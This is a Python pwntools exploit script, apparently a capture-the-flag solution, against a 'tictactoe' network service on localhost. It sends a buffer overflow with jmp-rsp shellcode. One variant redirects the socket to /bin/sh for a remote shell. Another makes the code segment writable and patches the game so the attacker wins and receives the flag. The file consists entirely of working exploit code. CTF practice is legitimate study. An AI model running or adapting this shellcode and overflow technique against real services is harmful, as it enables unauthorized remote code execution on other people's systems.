#!/usr/bin/python3
from pwn import *
elf = ELF('./tictactoe')
context.binary = elf

def gimme_shell():
    shell = asm(f"""
    mov r13, [{elf.symbols[b'psock']}]
    mov rdi, r13
    mov rsi, 0
    mov rax, 33
    syscall     # dup2(psock, stdin) 

    mov rdi, r13
    mov rsi, 1
    mov rax, 33
    syscall     # dup2(psock, stdout) 

    mov rdi, r13
    mov rsi, 2
    mov rax, 33
    syscall     # dup2(psock, stderr) 

    mov rdi, r13
    mov rax, 3
    syscall     # close(psock)

    xor     rdx, rdx
    mov     rbx, 0x68732f6e69622f2f
    shr     rbx, 0x8
    push    rbx
    mov     rdi, rsp
    push    rax
    push    rdi
    mov     rsi, rsp
    mov     al, 0x3b
    syscall     # execve("/bin/sh", ["/bin/sh"], NULL)""")

    jmp_rsp = asm('jmp rsp')

    t.sendline(jmp_rsp.ljust(0x58, b'\x00') + p64(elf.symbols[b'name']) + shell)

    t.interactive()

def gimme_flag():
    game_mod = asm(f"""
    mov rdi, 0x400000
    mov rsi, 0x5000
    mov rdx, 0x7        
    mov rax, 10
    syscall     # mprotect(0x400000, 0x5000, 0x7[RWX])

    mov BYTE PTR [0x401c86], 0xe8   # change:
    mov BYTE PTR [0x401c87], 0x9f   # 0x401C86: call get_computer_move
    mov BYTE PTR [0x401c88], 0xfd   # to
    mov BYTE PTR [0x401c89], 0xff   # 0x401C86: call get_human_move
    mov BYTE PTR [0x401c8a], 0xff   # offset calculation done manually

    push {elf.symbols[b'process_game']}
    ret         # return to process_game()
    """)

    jmp_rsp = asm('jmp rsp')
    
    _ = t.readuntil('name:')

    t.sendline(jmp_rsp.ljust(0x58, b'\x00') + p64(elf.symbols[b'name']) + game_mod)
    
    _ = t.readuntil('name:')

    t.send('elklepo\n')

    for i in range(100):
        print('game:', i)
        t.send('4\n') #  AI move
        _ = t.readuntil("Enter your move (1-9):")
        t.send('1\n') #  haxor move
        t.send('5\n') #  AI move
        _ = t.readuntil("Enter your move (1-9):")
        t.send('2\n') #  haxor move
        t.send('7\n') #  AI move
        _ = t.readuntil("Enter your move (1-9):")
        t.send('3\n') #  haxor move
        if i == 99:
            print('flag:', t.readall().decode())
        else:
            _ = t.readuntil("It's a win, nice one!")

t = remote('localhost', 8889)

#gimme_shell()
gimme_flag()
